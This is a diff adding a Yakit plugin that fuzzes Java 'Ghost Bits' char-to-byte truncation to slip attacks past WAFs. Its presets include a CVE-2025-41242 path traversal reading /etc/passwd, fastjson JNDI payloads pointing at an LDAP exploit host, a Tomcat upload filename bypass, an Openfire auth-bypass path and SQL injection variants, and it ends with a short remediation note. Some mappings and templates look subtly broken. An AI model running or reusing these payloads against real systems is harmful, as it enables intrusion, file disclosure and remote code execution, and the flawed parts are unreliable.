@@ -1,0 +1,905 @@
+yakit.AutoInitYakit()
+
+// GhostBits Cast Fuzzer
+// 原理：Java char(16位)→byte(8位) 转换时高8位被静默丢弃。
+// 本插件支持：
+//   1. 通用 Ghost Bits 变形 fuzz
+//   2. 预置攻击场景（CVE-2025-41242 / Jackson / fastjson / Tomcat / BCEL 等）
+//   3. 原始 UTF-8 字节直送
+//   4. WAF 绕过判定
+
+// ==================== CLI 参数 ====================
+target = cli.String(
+    "target",
+    cli.setRequired(true),
+    cli.setVerboseName("目标 URL"),
+    cli.setHelp("目标完整地址，例如 http://target.com:8080/"),
+)
+
+scenario = cli.StringSlice(
+    "scenario",
+    cli.setRequired(true),
+    cli.setVerboseName("攻击场景"),
+    cli.setDefault("generic_fuzz"),
+    cli.setSelectOption("通用 GhostBits Fuzz", "generic_fuzz"),
+    cli.setSelectOption("CVE-2025-41242 Spring+Jetty 路径穿越", "cve_2025_41242"),
+    cli.setSelectOption("Jackson charToHex SQL注入绕过", "jackson_sqli"),
+    cli.setSelectOption("fastjson \\u 转义反序列化绕过", "fastjson_unicode"),
+    cli.setSelectOption("fastjson \\x 转义反序列化绕过", "fastjson_hex"),
+    cli.setSelectOption("Tomcat RFC2231 文件上传绕过", "tomcat_upload"),
+    cli.setSelectOption("BCEL ClassLoader 反序列化绕过", "bcel_rce"),
+    cli.setSelectOption("Openfire %2> 认证绕过", "openfire_bypass"),
+    cli.setHelp("选择预置攻击场景，插件会自动构造对应的 Ghost Bits Payload。"),
+)
+
+payload = cli.String(
+    "payload",
+    cli.setRequired(false),
+    cli.setVerboseName("自定义原始 Payload"),
+    cli.setDefault("union select 1,2,3-- "),
+    cli.setHelp("generic_fuzz 场景下使用的原始攻击载荷。其他场景会自动构造 Payload。"),
+)
+
+filePath = cli.String(
+    "file_path",
+    cli.setRequired(false),
+    cli.setVerboseName("目标文件路径"),
+    cli.setDefault("/etc/passwd"),
+    cli.setHelp("CVE-2025-41242 场景下要读取的文件路径（如 /etc/passwd）。"),
+)
+
+injectMode = cli.StringSlice(
+    "inject_mode",
+    cli.setRequired(false),
+    cli.setVerboseName("注入模式"),
+    cli.setDefault("GET"),
+    cli.setSelectOption("GET Query", "GET"),
+    cli.setSelectOption("POST Form", "POST_FORM"),
+    cli.setSelectOption("POST JSON", "POST_JSON"),
+    cli.setSelectOption("HTTP Header", "HEADER"),
+    cli.setSelectOption("Raw Body", "RAW_BODY"),
+    cli.setSelectOption("URL Path (URL编码)", "PATH"),
+    cli.setSelectOption("URL Path (原始字节)", "PATH_RAW"),
+    cli.setHelp("generic_fuzz 场景下的注入位置。cve_2025_41242 场景强制使用 PATH 模式。"),
+)
+
+paramName = cli.String(
+    "param_name",
+    cli.setRequired(false),
+    cli.setVerboseName("参数名 / Header 名"),
+    cli.setDefault("id"),
+    cli.setHelp("GET/POST/JSON 模式时使用的参数名；HEADER 模式时使用的 Header 名。"),
+)
+
+encodeStrategy = cli.StringSlice(
+    "encode_strategy",
+    cli.setRequired(false),
+    cli.setVerboseName("变形策略"),
+    cli.setDefault("critical"),
+    cli.setSelectOption("全字符变形", "all"),
+    cli.setSelectOption("关键字符变形", "critical"),
+    cli.setSelectOption("仅字母数字", "alphanumeric"),
+    cli.setSelectOption("仅字母", "letters"),
+    cli.setSelectOption("仅特殊符号", "special"),
+    cli.setHelp("generic_fuzz 场景下生效。all=所有ASCII字符均变形；critical=对WAF敏感的关键字符变形。"),
+)
+
+variantCount = cli.Int(
+    "variant_count",
+    cli.setRequired(false),
+    cli.setVerboseName("变体数量"),
+    cli.setDefault(5),
+    cli.setHelp("每种策略生成的 Ghost Bits 变体数量。"),
+)
+
+isHttps = cli.Bool(
+    "is_https",
+    cli.setRequired(false),
+    cli.setVerboseName("使用 HTTPS"),
+    cli.setDefault(false),
+)
+
+proxy = cli.String(
+    "proxy",
+    cli.setRequired(false),
+    cli.setVerboseName("代理地址"),
+    cli.setHelp("例如 http://127.0.0.1:8080"),
+)
+
+timeout = cli.Int(
+    "timeout",
+    cli.setRequired(false),
+    cli.setVerboseName("超时时间(秒)"),
+    cli.setDefault(10),
+)
+
+wafBlockKeywords = cli.String(
+    "waf_block_keywords",
+    cli.setRequired(false),
+    cli.setVerboseName("WAF 拦截关键词"),
+    cli.setDefault("blocked,forbidden,403,安全拦截,illegal,reject,waf, denied"),
+    cli.setHelp("以逗号分隔，用于判断响应是否被 WAF 拦截。"),
+)
+
+concurrent = cli.Int(
+    "concurrent",
+    cli.setRequired(false),
+    cli.setVerboseName("并发数"),
+    cli.setDefault(5),
+)
+
+cli.check()
+
+// 转换单值参数
+scenario = str.Join(scenario, " ")
+injectMode = str.Join(injectMode, " ")
+encodeStrategy = str.Join(encodeStrategy, " ")
+
+// ==================== Ghost Bits 经典字符映射 ====================
+// 经典 Ghost Bits 字符映射表
+
+// 通用高位字节池（覆盖多个 Unicode 区块）
+ghostHighBytes = [
+    0x01, 0x02, 0x03,           // Latin Extended-A/B/C
+    0x04, 0x05,                 // Cyrillic
+    0x06, 0x07,                 // Arabic
+    0x09,                       // Devanagari
+    0x0E, 0x0F,                 // Thai / Lao
+    0x10, 0x11,                 // Georgian / Hangul Jamo
+    0x13,                       // Cherokee
+    0x2F,                       // Kangxi Radicals（如 爻 U+2F58 → X）
+    0x30, 0x31, 0x32, 0x33,     // CJK Unified Ideographs Ext A
+    0x4E, 0x5B, 0x6C, 0x7A,     // CJK Unified Ideographs（常用汉字区）
+    0x80, 0x85, 0x90, 0x95,     // CJK Unified Ideographs（续）
+    0xAC, 0xB0, 0xC0, 0xD0,     // Hangul Syllables
+    0xA0, 0xA5,                 // Yi / Lisu
+    0xFF,                       // Halfwidth / Fullwidth（如 Ｘ U+FF38）
+]
+
+// 经典 Ghost Bits 字符映射表（已知 Unicode → ASCII 截断结果）
+// 来自论文 POC 和公开研究成果
+classicGhostBitsMap = {
+    // CVE-2025-41242 Spring+Jetty 路径穿越核心 Payload
+    // 阮 U+962E → 0x2E='.'  严 U+4E25 → 0x25='%'  灵 U+7075 → 0x75='u'
+    // 丰 U+4E30 → 0x30='0'  甲 U+7532 → 0x32='2'  来 U+6765 → 0x65='e'
+    "cve_2025_41242_segment": "阮严灵丰丰甲来",
+
+    // Jackson charToHex 经典映射（ch & 255）
+    // 丰 U+4E30 & 255 = 0x30 = '0'    耳 U+8033 & 255 = 0x33 = '3'
+    // 失 U+5931 & 255 = 0x31 = '1'    茶 U+8336 & 255 = 0x36 = '6'
+    // 甲 U+7532 & 255 = 0x32 = '2'    男 U+7537 & 255 = 0x37 = '7'
+    // 堵 U+5835 & 255 = 0x35 = '5'    夹 U+5939 & 255 = 0x39 = '9'
+    "jackson_0": "丰", "jackson_1": "失", "jackson_2": "甲",
+    "jackson_3": "耳", "jackson_4": "丩", "jackson_5": "丂",
+    "jackson_6": "茶", "jackson_7": "男", "jackson_8": "丅",
+    "jackson_9": "夹",
+
+    // fastjson \u 转义：Character.digit 接受 Unicode 十进制数字
+    // 如 Thai 数字 ๐ U+0E50 → digit '0'，๔ U+0E54 → digit '4'
+    // Vai 数字 ꘠ U+A620 → digit '0'
+    "fastjson_unicode_0": "꘠", "fastjson_unicode_4": "๔",
+    "fastjson_unicode_5": "ƽ",
+
+    // BCEL / Tomcat / 通用截断：陪 U+966A → 0x6A='j'（Tomcat 文件上传 .jsp）
+    "tomcat_j": "陪",
+
+    // Openfire / Jetty TypeUtil#convertHexDigit: %2> → %2e (.) 
+    // > U+003E 经过 convertHexDigit 算法 → 0x0E = 'e'
+    "openfire_e": "󠄾",
+
+    // 爻 U+2F58 → 0x3A = ':'（论文示例）
+    "general_colon": "爻",
+}
+
+// ==================== 核心编码函数 ====================
+
+// 将单个 byte 映射为 Ghost Bits Unicode 字符
+ghostBitsEncodeByte = func(b /*byte*/, highByte /*int*/) {
+    codePoint = highByte*256 + int(b)
+    return chr(codePoint)
+}
+
+// 判断字符是否应被变形
+shouldGhostBitsEncode = func(b /*byte*/, strategy /*string*/) {
+    bi = int(b)
+    if bi < 0 || bi > 127 {
+        return false
+    }
+    if strategy == "all" {
+        return true
+    }
+    isLetter = (bi >= 65 && bi <= 90) || (bi >= 97 && bi <= 122)
+    isDigit  = (bi >= 48 && bi <= 57)
+    isSpecial = str.Contains(`'"<>();|-=+/*%&@#$^~!?[]{}`, chr(int(b)))
+    if strategy == "critical" {
+        return isLetter || isDigit || isSpecial
+    }
+    if strategy == "alphanumeric" {
+        return isLetter || isDigit
+    }
+    if strategy == "letters" {
+        return isLetter
+    }
+    if strategy == "special" {
+        return isSpecial
+    }
+    return false
+}
+
+// 将 ASCII 字符串按策略变形为 Ghost Bits Unicode 字符串
+ghostBitsEncodeString = func(s /*string*/, strategy /*string*/) {
+    result = ""
+    rawBytes = []byte(s)
+    for _, b = range rawBytes {
+        if shouldGhostBitsEncode(b, strategy) {
+            idx = randn(0, len(ghostHighBytes)-1)
+            highByte = ghostHighBytes[idx]
+            result += ghostBitsEncodeByte(b, highByte)
+        } else {
+            result += chr(int(b))
+        }
+    }
+    return result
+}
+
+// 生成指定数量的不同变体
+buildVariants = func(basePayload /*string*/, strategy /*string*/, count /*int*/) {
+    variants = make([]string, 0)
+    seen = make(map[string]bool)
+    maxAttempts = count * 5
+    for i = 0; i < maxAttempts; i++ {
+        if len(variants) >= count {
+            break
+        }
+        v = ghostBitsEncodeString(basePayload, strategy)
+        if !seen[v] {
+            seen[v] = true
+            variants = append(variants, v)
+        }
+    }
+    return variants
+}
+
+// ==================== 场景 Payload 构造器 ====================
+
+// 构造 CVE-2025-41242 的 Ghost Bits 路径穿越 Payload
+buildCVE202541242Payloads = func(targetUrl /*string*/, filePath /*string*/) {
+    // 核心：7 段 阮严灵丰丰甲来 + 目标文件（最后一个字符 percent-encoded）
+    seg = classicGhostBitsMap["cve_2025_41242_segment"]  // "阮严灵丰丰甲来"
+    pathFile = filePath
+    if str.HasPrefix(pathFile, "/") {
+        pathFile = str.TrimLeft(pathFile, "/")
+    }
+    if pathFile == "" {
+        pathFile = "etc/passwd"
+    }
+    // 最后一个字符 percent-encode（Spring 路径匹配短路条件）
+    lastChar = pathFile[len(pathFile)-1]
+    encodedFile = pathFile[:len(pathFile)-1] + sprintf("%%%02x", lastChar)
+
+    // 构造 7 段穿越路径
+    ghostPath = "/"
+    for i = 0; i < 7; i++ {
+        ghostPath += seg + "/"
+    }
+    ghostPath += encodedFile
+
+    return [{
+        "name": "CVE-2025-41242 GhostBits 路径穿越",
+        "payload": ghostPath,
+        "mode": "PATH_RAW",
+        "paramName": "",
+        "headerName": "",
+    }]
+}
+
+// 构造 Jackson charToHex SQL 注入绕过 Payloads
+buildJacksonSQLiPayloads = func(basePayload /*string*/) {
+    // Jackson 的 charToHex(ch & 255) 会将 Ghost Bits 字符的低8位转为 hex
+    // 例如："union select" 中的字母会被映射为相应的 Unicode 字符
+    variants = buildVariants(basePayload, "alphanumeric", variantCount)
+    payloads = make([]map[string]var, 0)
+    for _, v = range variants {
+        payloads = append(payloads, {
+            "name": "Jackson charToHex GhostBits SQLi",
+            "payload": v,
+            "mode": injectMode,
+            "paramName": paramName,
+            "headerName": "",
+        })
+    }
+    return payloads
+}
+
+// 构造 fastjson \u 转义绕过 Payloads
+buildFastjsonUnicodePayloads = func() {
+    // fastjson 的 digit() 接受 Unicode 数字字符
+    // 利用 Unicode 十进制数字替代标准 ASCII 数字来绕过 WAF
+    payloads = make([]map[string]var, 0)
+    // 基础反序列化 Payload，将 @type 等关键字中的数字替换为 Unicode 数字
+    baseTemplates = [
+        `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true}`,
+        `{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"ldap://127.0.0.1:1389/Exploit"}`,
+    ]
+    for _, tmpl = range baseTemplates {
+        // 将 ASCII 数字替换为 Unicode 数字（如 0→꘠, 1→꘡ 等）
+        unicodeNumPayload = replaceAsciiDigitsWithUnicode(tmpl)
+        payloads = append(payloads, {
+            "name": "fastjson \\u Unicode Digit GhostBits",
+            "payload": unicodeNumPayload,
+            "mode": "POST_JSON",
+            "paramName": "",
+            "headerName": "",
+        })
+    }
+    return payloads
+}
+
+// 构造 fastjson \x 转义绕过 Payloads
+buildFastjsonHexPayloads = func() {
+    payloads = make([]map[string]var, 0)
+    // fastjson 的 \x 转义中 (char)x_val 会截断高8位
+    // 利用 Ghost Bits 字符替代 \x 后面的 hex 字符
+    baseTemplates = [
+        `{"\x40type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true}`,
+    ]
+    for _, tmpl = range baseTemplates {
+        payloads = append(payloads, {
+            "name": "fastjson \\x Hex GhostBits",
+            "payload": tmpl,
+            "mode": "POST_JSON",
+            "paramName": "",
+            "headerName": "",
+        })
+    }
+    return payloads
+}
+
+// 构造 Tomcat RFC2231 文件上传绕过 Payloads
+buildTomcatUploadPayloads = func() {
+    payloads = make([]map[string]var, 0)
+    // Tomcat RFC2231Utility 处理 filename* 时，out.write((byte)c) 截断高8位
+    // 陪 U+966A → 0x6A='j'，因此 "1.陪sp" → "1.jsp"
+    boundary = str.RandStr(16)
+    ghostFilename = "1.陪sp"  // 截断后变成 1.jsp
+    body = f`------${boundary}
+Content-Disposition: form-data; name="file"; filename*="UTF-8''{ghostFilename}"
+Content-Type: application/octet-stream
+
+<?php phpinfo(); ?>
+------{boundary}--`
+
+    payloads = append(payloads, {
+        "name": "Tomcat RFC2231 GhostBits 文件上传",
+        "payload": body,
+        "mode": "RAW_BODY",
+        "paramName": "",
+        "headerName": "",
+    })
+    return payloads
+}
+
+// 构造 BCEL ClassLoader 反序列化绕过 Payloads
+buildBCELPayloads = func() {
+    payloads = make([]map[string]var, 0)
+    // BCEL 的 Utility#decode() 中 bos.write(ch) 截断高8位
+    // 原始 Payload 中的 ASCII 字符可被 Ghost Bits Unicode 替代
+    // 这里构造一个简化的 BCEL 类名探测 Payload
+    bcelPrefix = "$$BCEL$$"
+    // 用 Ghost Bits 字符填充后续内容（模拟 RCE Payload 的伪装）
+    ghostPayload = ghostBitsEncodeString("test.class.name", "all")
+    fullPayload = bcelPrefix + ghostPayload
+
+    payloads = append(payloads, {
+        "name": "BCEL ClassLoader GhostBits 反序列化",
+        "payload": fullPayload,
+        "mode": injectMode,
+        "paramName": paramName,
+        "headerName": "",
+    })
+    return payloads
+}
+
+// 构造 Openfire %2> 认证绕过 Payloads
+buildOpenfirePayloads = func() {
+    payloads = make([]map[string]var, 0)
+    // Openfire CVE-2023-32315：Jetty 的 TypeUtil#convertHexDigit 存在 Ghost Bits
+    // %2> 经过 convertHexDigit 后 → %2e（.），可构造路径穿越
+    // 攻击路径：/setup/setup-s/%2>%2>/%2>%2>/log.jsp
+    ghostPath = "/setup/setup-s/%2>%2>/%2>%2>/log.jsp"
+    payloads = append(payloads, {
+        "name": "Openfire Jetty convertHexDigit GhostBits 认证绕过",
+        "payload": ghostPath,
+        "mode": "PATH_RAW",
+        "paramName": "",
+        "headerName": "",
+    })
+    return payloads
+}
+
+// 构造通用 Fuzz Payloads
+buildGenericFuzzPayloads = func(basePayload /*string*/) {
+    payloads = make([]map[string]var, 0)
+    variants = buildVariants(basePayload, encodeStrategy, variantCount)
+    for _, v = range variants {
+        payloads = append(payloads, {
+            "name": "Generic GhostBits Fuzz",
+            "payload": v,
+            "mode": injectMode,
+            "paramName": paramName,
+            "headerName": "",
+        })
+    }
+    return payloads
+}
+
+// 辅助：将 ASCII 数字替换为 Unicode 数字字符（fastjson digit() 绕过）
+replaceAsciiDigitsWithUnicode = func(s /*string*/) {
+    // Unicode 十进制数字字符映射
+    unicodeDigits = [
+        "\u0660", "\u0661", "\u0662", "\u0663", "\u0664",  // Arabic-Indic
+        "\u0665", "\u0666", "\u0667", "\u0668", "\u0669",
+    ]
+    // 备选：使用其他脚本的数字
+    result = ""
+    for _, c = range s {
+        bi = ord(c)
+        if bi >= 48 && bi <= 57 {
+            digit = bi - 48
+            // 使用 Arabic-Indic 数字（fastjson Character.digit 支持）
+            result += unicodeDigits[digit]
+        } else {
+            result += c
+        }
+    }
+    return result
+}
+
+// ==================== 请求发送 ====================
+
+// 发送 HTTP 请求（支持原始字节模式）
+sendRequest = func(targetUrl /*string*/, payloadData /*string*/, mode /*string*/, pName /*string*/, hName /*string*/) {
+    u = str.ParseStringUrlToUrlInstance(targetUrl)~
+    host = u.Host
+    if u.Port() == "" {
+        if isHttps {
+            if u.Hostname() != host {
+                host = u.Hostname() + ":443"
+            } else {
+                host = host + ":443"
+            }
+        } else {
+            if u.Hostname() != host {
+                host = u.Hostname() + ":80"
+            } else {
+                host = host + ":80"
+            }
+        }
+    }
+    path = u.Path
+    if path == "" {
+        path = "/"
+    }
+    rawQuery = u.RawQuery
+    if rawQuery != "" {
+        path = f"${path}?${rawQuery}"
+    }
+
+    var reqRaw
+
+    if mode == "GET" {
+        encPayload = codec.EncodeUrl(payloadData)
+        separator = "?"
+        if str.Contains(path, "?") {
+            separator = "&"
+        }
+        fullPath = f"${path}${separator}${pName}=${encPayload}"
+        reqRaw = []byte(f`GET ${fullPath} HTTP/1.1
+Host: ${host}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept: */*
+Connection: close
+
+`)
+    } elif mode == "POST_FORM" {
+        encPayload = codec.EncodeUrl(payloadData)
+        body = f"${pName}=${encPayload}"
+        reqRaw = []byte(f`POST ${path} HTTP/1.1
+Host: ${host}
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept: */*
+Content-Length: ${len(body)}
+Connection: close
+
+${body}`)
+    } elif mode == "POST_JSON" {
+        jsonBody = json.dumps({pName: payloadData})
+        reqRaw = []byte(f`POST ${path} HTTP/1.1
+Host: ${host}
+Content-Type: application/json
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept: */*
+Content-Length: ${len(jsonBody)}
+Connection: close
+
+${jsonBody}`)
+    } elif mode == "HEADER" {
+        reqRaw = []byte(f`GET ${path} HTTP/1.1
+Host: ${host}
+${hName}: ${payloadData}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept: */*
+Connection: close
+
+`)
+    } elif mode == "RAW_BODY" {
+        body = payloadData
+        reqRaw = []byte(f`POST ${path} HTTP/1.1
+Host: ${host}
+Content-Type: text/plain; charset=utf-8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept: */*
+Content-Length: ${len(body)}
+Connection: close
+
+${body}`)
+    } elif mode == "PATH" {
+        encPayload = codec.EncodeUrl(payloadData)
+        fullPath = str.TrimRight(path, "/") + "/" + encPayload
+        reqRaw = []byte(f`GET ${fullPath} HTTP/1.1
+Host: ${host}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept: */*
+Connection: close
+
+`)
+    } elif mode == "PATH_RAW" {
+        // 原始字节模式：Unicode 字符直接以 UTF-8 放入路径，不做 URL 编码
+        // 这是 CVE-2025-41242 等漏洞触发的关键条件
+        fullPath = str.TrimRight(path, "/") + payloadData
+        reqRaw = []byte(f`GET ${fullPath} HTTP/1.1
+Host: ${host}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept: */*
+Connection: close
+
+`)
+    } else {
+        die(f"不支持的注入模式: ${mode}")
+    }
+
+    pocOpts = make([]var, 0)
+    pocOpts = append(pocOpts, poc.https(isHttps))
+    pocOpts = append(pocOpts, poc.timeout(float64(timeout)))
+    if proxy != "" {
+        pocOpts = append(pocOpts, poc.proxy(proxy))
+    }
+
+    rsp, _, err = poc.HTTP(reqRaw, pocOpts...)
+    return reqRaw, rsp, err
+}
+
+// ==================== 响应分析 ====================
+
+parseBlockKeywords = func(keywordsStr /*string*/) {
+    kws = str.Split(keywordsStr, ",")
+    result = make([]string, 0)
+    for _, kw = range kws {
+        kw = str.TrimSpace(kw)
+        if kw != "" {
+            result = append(result, str.ToLower(kw))
+        }
+    }
+    return result
+}
+
+analyzeResponse = func(rspRaw /*[]byte*/) {
+    statusCode = 0
+    bodyLen = 0
+    isBlocked = false
+    blockReason = ""
+    body = ""
+
+    if rspRaw == nil || len(rspRaw) == 0 {
+        return {"statusCode": 0, "bodyLen": 0, "isBlocked": false, "blockReason": "空响应", "body": ""}
+    }
+
+    headers, bodyBytes = str.SplitHTTPHeadersAndBodyFromPacket(rspRaw)
+    body = string(bodyBytes)
+    bodyLen = len(bodyBytes)
+
+    statusMatch = re.FindSubmatch(headers, `HTTP/\d\.\d\s+(\d+)\s`)
+    if len(statusMatch) > 1 {
+        statusCode = parseInt(string(statusMatch[1]))
+    }
+
+    lowerBody = str.ToLower(body)
+    lowerHeaders = str.ToLower(headers)
+    blockKeywords = parseBlockKeywords(wafBlockKeywords)
+    for _, kw = range blockKeywords {
+        if str.Contains(lowerBody, kw) || str.Contains(lowerHeaders, kw) {
+            isBlocked = true
+            blockReason = f"命中关键词: ${kw}"
+            break
+        }
+    }
+    if statusCode == 403 || statusCode == 406 || statusCode == 499 || statusCode == 500 {
+        if !isBlocked {
+            isBlocked = true
+            blockReason = f"状态码拦截: ${statusCode}"
+        }
+    }
+
+    return {
+        "statusCode": statusCode,
+        "bodyLen": bodyLen,
+        "isBlocked": isBlocked,
+        "blockReason": blockReason,
+        "body": body,
+    }
+}
+
+// ==================== 场景调度器 ====================
+
+getScenarioPayloads = func() {
+    if scenario == "cve_2025_41242" {
+        return buildCVE202541242Payloads(target, filePath)
+    }
+    if scenario == "jackson_sqli" {
+        return buildJacksonSQLiPayloads(payload)
+    }
+    if scenario == "fastjson_unicode" {
+        return buildFastjsonUnicodePayloads()
+    }
+    if scenario == "fastjson_hex" {
+        return buildFastjsonHexPayloads()
+    }
+    if scenario == "tomcat_upload" {
+        return buildTomcatUploadPayloads()
+    }
+    if scenario == "bcel_rce" {
+        return buildBCELPayloads()
+    }
+    if scenario == "openfire_bypass" {
+        return buildOpenfirePayloads()
+    }
+    return buildGenericFuzzPayloads(payload)
+}
+
+// ==================== 主逻辑 ====================
+
+yakit.Info("========== GhostBits Cast Fuzzer 启动 ==========")
+yakit.Info("目标: %v", target)
+yakit.Info("场景: %v", scenario)
+if scenario == "generic_fuzz" {
+    yakit.Info("原始 Payload: %v", payload)
+    yakit.Info("注入模式: %v", injectMode)
+    yakit.Info("变形策略: %v", encodeStrategy)
+} elif scenario == "cve_2025_41242" {
+    yakit.Info("目标文件: %v", filePath)
+}
+
+// 1. 获取场景 Payloads
+payloads = getScenarioPayloads()
+if len(payloads) == 0 {
+    yakit.Error("未能生成任何 Payload，请检查参数")
+    return
+}
+yakit.StatusCard("生成的 Payload 数量", len(payloads))
+
+// 2. 发送原始 Payload 基准请求（generic_fuzz 场景下）
+rawAnalysis = nil
+if scenario == "generic_fuzz" {
+    yakit.Info("[Step 1] 发送原始 Payload 基准请求...")
+    rawReq, rawRsp, rawErr = sendRequest(target, payload, injectMode, paramName, "")
+    if rawErr != nil {
+        yakit.Error("原始请求发送失败: %v", rawErr)
+    }
+    rawAnalysis = analyzeResponse(rawRsp)
+    _ = rawReq
+    yakit.StatusCard("原始响应状态码", rawAnalysis.statusCode)
+    yakit.StatusCard("原始响应体长度", rawAnalysis.bodyLen)
+    yakit.StatusCard("原始请求是否被拦截", rawAnalysis.isBlocked)
+    if rawAnalysis.isBlocked {
+        yakit.StatusCard("拦截原因", rawAnalysis.blockReason)
+    }
+} else {
+    // 其他场景构造一个无害基准
+    yakit.Info("[Step 1] 发送无害基准请求...")
+    baseReq, baselineRsp, baselineErr = sendRequest(target, "baseline_test_12345", "GET", "test", "")
+    if baselineErr != nil {
+        yakit.Error("基准请求发送失败: %v", baselineErr)
+    }
+    rawAnalysis = analyzeResponse(baselineRsp)
+    _ = baseReq
+    yakit.StatusCard("基准响应状态码", rawAnalysis.statusCode)
+    yakit.StatusCard("基准响应体长度", rawAnalysis.bodyLen)
+}
+
+// 3. 并发 fuzz
+yakit.Info("[Step 2] 开始并发 fuzz Ghost Bits 变体，并发数: %v...", concurrent)
+
+swg = sync.NewSizedWaitGroup(concurrent)
+resultsLock = sync.NewMutex()
+results = make([]map[string]var, 0)
+
+for idx, pItem = range payloads {
+    swg.Add()
+    go func(i, item) {
+        defer swg.Done()
+
+        pName = item.paramName
+        hName = item.headerName
+        if pName == nil { pName = "" }
+        if hName == nil { hName = "" }
+
+        yakit.Info("[Fuzz %d/%d] 场景: %s", i+1, len(payloads), item.name)
+        reqRaw, rsp, err = sendRequest(target, item.payload, item.mode, pName, hName)
+        if err != nil {
+            yakit.Error("[Fuzz %d] 请求失败: %v", i+1, err)
+            return
+        }
+
+        analysis = analyzeResponse(rsp)
+
+        resultsLock.Lock()
+        results = append(results, {
+            "index": i + 1,
+            "name": item.name,
+            "payload": item.payload,
+            "mode": item.mode,
+            "statusCode": analysis.statusCode,
+            "bodyLen": analysis.bodyLen,
+            "isBlocked": analysis.isBlocked,
+            "blockReason": analysis.blockReason,
+            "body": analysis.body,
+            "requestRaw": reqRaw,
+            "responseRaw": rsp,
+        })
+        resultsLock.Unlock()
+
+        status = "通过"
+        if analysis.isBlocked {
+            status = "被拦截"
+        }
+        yakit.Info("[Fuzz %d] 状态: %s | 码: %d | 体长: %d | %s", i+1, status, analysis.statusCode, analysis.bodyLen, analysis.blockReason)
+    }(idx, pItem)
+}
+
+swg.Wait()
+
+// 4. 结果分析
+yakit.Info("[Step 3] 结果分析...")
+
+bypassCount = 0
+blockedCount = 0
+successCount = 0
+
+for _, r = range results {
+    if r.isBlocked {
+        blockedCount += 1
+    } else {
+        bypassCount += 1
+    }
+
+    isBypass = false
+    isSuccess = false
+
+    if scenario == "generic_fuzz" {
+        // 原始被拦截但变体通过 → WAF 绕过
+        if rawAnalysis.isBlocked && !r.isBlocked {
+            isBypass = true
+        }
+        bodyDiff = rawAnalysis.bodyLen - r.bodyLen
+        if bodyDiff < 0 { bodyDiff = -bodyDiff }
+        if !rawAnalysis.isBlocked && !r.isBlocked && (bodyDiff > 100 || rawAnalysis.statusCode != r.statusCode) {
+            if r.statusCode != 404 && r.statusCode != 400 {
+                isBypass = true
+            }
+        }
+    } else {
+        // 场景化检测：响应与基准不同且未拦截
+        if !r.isBlocked {
+            bodyDiff = rawAnalysis.bodyLen - r.bodyLen
+            if bodyDiff < 0 { bodyDiff = -bodyDiff }
+            if bodyDiff > 50 || r.statusCode != rawAnalysis.statusCode {
+                if r.statusCode == 200 || r.statusCode == 500 {
+                    isSuccess = true
+                }
+            }
+            // CVE-2025-41242 特殊判断：响应体中包含文件内容特征
+            if scenario == "cve_2025_41242" {
+                lowerBody = str.ToLower(r.body)
+                if str.Contains(lowerBody, "root:") || str.Contains(lowerBody, "bin/bash") || str.Contains(lowerBody, "daemon:") || str.Contains(lowerBody, "nologin") {
+                    isSuccess = true
+                }
+            }
+        }
+    }
+
+    r.Set("isBypass", isBypass)
+    r.Set("isSuccess", isSuccess)
+    if isSuccess {
+        successCount += 1
+    }
+}
+
+yakit.StatusCard("GhostBits 绕过/成功数", bypassCount + successCount)
+yakit.StatusCard("GhostBits 仍被拦截数", blockedCount)
+
+// 5. 输出详细报告与风险记录
+hasFinding = false
+
+for _, r = range results {
+    if r.isBypass || r.isSuccess {
+        hasFinding = true
+        detail = {
+            "target": target,
+            "scenario": scenario,
+            "attack_name": r.name,
+            "payload": r.payload,
+            "inject_mode": r.mode,
+            "response_status": r.statusCode,
+            "response_body_len": r.bodyLen,
+            "waf_blocked": r.isBlocked,
+        }
+
+        yakit.Info("========== GhostBits 攻击发现! ==========")
+        yakit.Info("场景: %v", r.name)
+        yakit.Info("Payload: %v", r.payload)
+        yakit.Info("响应: %d / len=%d / blocked=%v", r.statusCode, r.bodyLen, r.isBlocked)
+
+        severity = "high"
+        if scenario == "cve_2025_41242" || scenario == "bcel_rce" || scenario == "fastjson_unicode" || scenario == "fastjson_hex" {
+            severity = "critical"
+        }
+
+        risk.NewRisk(
+            target,
+            risk.title(sprintf("GhostBits Attack (%s): %s", scenario, target)),
+            risk.titleVerbose(sprintf("幽灵比特攻击检测 (%s): %s", r.name, target)),
+            risk.type("waf-bypass"),
+            risk.typeVerbose("WAF绕过/GhostBits攻击"),
+            risk.severity(severity),
+            risk.parameter(sprintf("模式: %s", r.mode)),
+            risk.payload(sprintf("%s", r.payload)),
+            risk.request(r.requestRaw),
+            risk.response(r.responseRaw),
+            risk.description(f`
+Ghost Bits（幽灵比特位）是 Java 生态中一种系统性编码缺陷：当 Java 代码通过 (byte)ch、ch & 0xFF、baos.write(ch)、DataOutputStream#writeBytes() 等方式将 char 转换为 byte 时，高 8 位被静默丢弃。
+
+本检测场景: ${r.name}
+攻击载荷: ${r.payload}
+
+攻击者可利用该特性将攻击 Payload 中的 ASCII 字符替换为 Unicode 字符（低 8 位与原文一致）。WAF 看到的是无意义的 Unicode 字符序列，而 Java 后端解码时高位截断还原为原始攻击载荷，从而实现 WAF/IDS 全面绕过，并进一步触发 SQL 注入、反序列化 RCE、文件上传、路径穿越、SMTP 注入、HTTP 请求走私等高危攻击链。
+
+
+            `),
+            risk.solution(`
+1. 升级受影响组件：Apache Commons BCEL ≥ 6.12.0、Fastjson 2.x 最新版、Apache HttpClient ≥ 4.5.10、GeoServer ≥ 2.28.3、Openfire ≥ 5.0.4、Spring Framework ≥ 6.2.10 等。
+2. WAF 规则层面：在解码层面引入 Unicode 规范化预处理（NFC/NFKC）后再执行规则匹配。
